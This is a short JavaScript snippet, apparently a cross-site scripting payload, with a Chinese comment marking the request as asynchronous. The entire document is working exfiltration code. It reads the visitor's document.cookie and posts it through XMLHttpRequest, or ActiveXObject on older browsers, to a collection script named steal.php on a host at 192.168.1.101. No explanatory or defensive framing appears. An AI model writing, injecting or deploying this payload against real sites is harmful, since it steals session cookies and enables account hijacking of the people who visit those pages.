var url = "http://192.168.1.101:808/steal.php";
var postStr = "data="+document.cookie;
var ajax = null;
if (window.XMLHttpRequest) {
    ajax = new XMLHttpRequest();
} else if (window.ActiveXObject) {
    ajax = new ActiveXObject("Microsoft.XMLHTTP");
} else {
    ajax=null;
}
ajax.open("POST", url, true);//true代表异步
ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajax.send(postStr);